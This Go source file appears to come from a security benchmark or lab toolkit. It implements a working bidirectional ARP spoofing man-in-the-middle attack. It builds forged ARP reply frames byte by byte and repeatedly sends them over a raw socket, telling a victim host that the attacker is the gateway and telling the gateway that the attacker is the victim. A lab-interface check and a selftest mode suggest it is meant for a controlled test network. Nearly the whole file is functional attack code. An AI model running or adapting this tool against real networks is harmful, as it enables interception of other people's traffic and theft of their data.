package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const (
	etherTypeARP = 0x0806
	arpOpReply   = 2
)

// buildPoison is the byte-level equivalent of Ether()/ARP() in the Python
// helper. With no dst MAC, Scapy leaves ARP hwdst zeroed and uses a broadcast
// Ethernet destination; that is the path used by both poison frames here.
func buildPoison(spoofIP, realIP string, srcMAC, dstMAC net.HardwareAddr) ([]byte, error) {
	if len(srcMAC) != 6 {
		return nil, fmt.Errorf("source MAC must contain six octets")
	}
	spoof := net.ParseIP(spoofIP).To4()
	if spoof == nil {
		return nil, fmt.Errorf("invalid IPv4 address %q", spoofIP)
	}
	real := net.ParseIP(realIP).To4()
	if real == nil {
		return nil, fmt.Errorf("invalid IPv4 address %q", realIP)
	}

	etherDst := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	arpDst := make(net.HardwareAddr, 6)
	if len(dstMAC) != 0 {
		if len(dstMAC) != 6 {
			return nil, fmt.Errorf("destination MAC must contain six octets")
		}
		etherDst = append(net.HardwareAddr(nil), dstMAC...)
		copy(arpDst, dstMAC)
	}

	frame := make([]byte, 14+28)
	copy(frame[0:6], etherDst)
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], etherTypeARP)

	arp := frame[14:]
	binary.BigEndian.PutUint16(arp[0:2], 1)          // Ethernet hardware type
	binary.BigEndian.PutUint16(arp[2:4], 0x0800)     // IPv4 protocol type
	arp[4] = 6                                       // hardware address length
	arp[5] = 4                                       // protocol address length
	binary.BigEndian.PutUint16(arp[6:8], arpOpReply) // is-at / reply
	copy(arp[8:14], srcMAC)                          // hwsrc
	copy(arp[14:18], spoof)                          // psrc
	copy(arp[18:24], arpDst)                         // hwdst
	copy(arp[24:28], real)                           // pdst
	return frame, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("Bidirectional ARP spoof / MITM between target and gateway")
	targetIP := fs.String("target_ip", "", "victim host IP")
	gatewayIP := fs.String("gateway_ip", "", "gateway IP")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	srcMAC := attackcommon.InterfaceMAC(common.Iface)
	if common.Selftest {
		frame, err := buildPoison("192.168.1.1", "192.168.1.10", srcMAC, nil)
		if err != nil {
			attackcommon.Status("FATAL", fmt.Sprintf("selftest packet build failed: %v", err))
			return 1
		}
		attackcommon.SelftestOK("arp_spoof", fmt.Sprintf("forged ARP reply len=%d", len(frame)))
		return 0
	}

	if *targetIP == "" || *gatewayIP == "" {
		attackcommon.Status("FATAL", "--target_ip and --gateway_ip are both required")
		return 1
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		// Tell the target "I am the gateway", and the gateway "I am the target".
		toTarget, err := buildPoison(*gatewayIP, *targetIP, srcMAC, nil)
		if err != nil {
			return err
		}
		if err := sender.Send(toTarget); err != nil {
			return fmt.Errorf("send target poison: %w", err)
		}
		toGateway, err := buildPoison(*targetIP, *gatewayIP, srcMAC, nil)
		if err != nil {
			return err
		}
		if err := sender.Send(toGateway); err != nil {
			return fmt.Errorf("send gateway poison: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("poison round #%d: %s<-(fake gw), %s<-(fake target)", n+1, *targetIP, *gatewayIP))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
